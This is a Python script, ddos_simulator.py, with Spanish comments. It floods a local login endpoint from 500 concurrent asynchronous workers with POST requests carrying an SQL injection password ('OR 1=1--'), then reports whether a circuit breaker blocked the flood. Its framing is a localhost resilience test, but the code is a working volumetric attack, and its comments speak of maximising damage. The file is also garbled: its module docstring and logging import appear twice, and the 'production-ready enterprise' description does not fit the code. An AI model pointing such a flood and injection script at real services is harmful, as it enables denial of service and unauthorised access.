"""
Module: ddos_simulator.py
Description: Production-ready enterprise component for Ddos Simulator.
Hardened with Zero Trust, structured logging, and dynamic environment configuration.
"""

import logging

import logging


logger = logging.getLogger(__name__)
"""
Module: ddos_simulator.py
Description: Production-ready enterprise component for Ddos Simulator.
Hardened with Zero Trust, structured logging, and dynamic environment configuration.
"""

import asyncio
import aiohttp
import time
import sys

TARGET_URL = "http://127.0.0.1:8000/api/v3/auth/login"
REQUESTS_PER_SECOND = 5000
DURATION_SECONDS = 10
CONCURRENCY = 500

async def malicious_request(session, url):
    payload = {
        "email": "admin@bunker.local",
        "password": "sql_injection_or_brute_force_payload' OR 1=1--"
    }
    try:
        async with session.post(url, json=payload, timeout=2) as response:
            return response.status
    except Exception:
        return 0  # 0 indicates connection dropped/refused

async def attack_worker(session, url, end_time):
    success_count = 0
    fail_count = 0
    while time.time() < end_time:
        status = await malicious_request(session, url)
        if status == 0 or status == 403 or status == 503:
            fail_count += 1
        else:
            success_count += 1
        # Pequeño sleep para no asfixiar el event loop local, pero logrando alto volumen
        await asyncio.sleep(0.001)
    return success_count, fail_count

async def main():
    logger.info(f"[*] Iniciando Simulador DAST (Ataque Volumétrico T1499)")
    logger.info(f"[*] Objetivo: {TARGET_URL}")
    logger.info(f"[*] Concurrencia: {CONCURRENCY} workers paralelos")
    logger.info(f"[*] Duración: {DURATION_SECONDS} segundos")
    
    end_time = time.time() + DURATION_SECONDS
    
    # Customizamos el conector para no limitar las conexiones y maximizar el daño volumétrico
    connector = aiohttp.TCPConnector(limit=0)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(CONCURRENCY):
            tasks.append(asyncio.create_task(attack_worker(session, TARGET_URL, end_time)))
            
        logger.info("[!] Fuego a discreción...")
        start_time = time.time()
        results = await asyncio.gather(*tasks)
        elapsed = time.time() - start_time
        
    total_success = sum(r[0] for r in results)
    total_fails = sum(r[1] for r in results)
    total_requests = total_success + total_fails
    
    logger.info("\n==========================================================")
    logger.info(" [!] REPORTE POST-ACCIÓN (DAST)")
    logger.info("==========================================================")
    logger.info(f" Total peticiones lanzadas : {total_requests}")
    logger.info(f" RPS (Requests per second) : {total_requests / elapsed:.2f}")
    logger.info(f" Peticiones procesadas     : {total_success}")
    logger.info(f" Peticiones bloqueadas/drop: {total_fails}")
    
    if total_fails > total_success:
        logger.info("\n [✓] EVALUACIÓN: El mecanismo de resiliencia (Circuit Breaker / Air-Gap) actuó de manera efectiva.")
    else:
        logger.info("\n [X] EVALUACIÓN: El servidor sucumbió o no bloqueó el ataque volumétrico.")
        
if __name__ == "__main__":
    # Optimizaciones para Windows
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
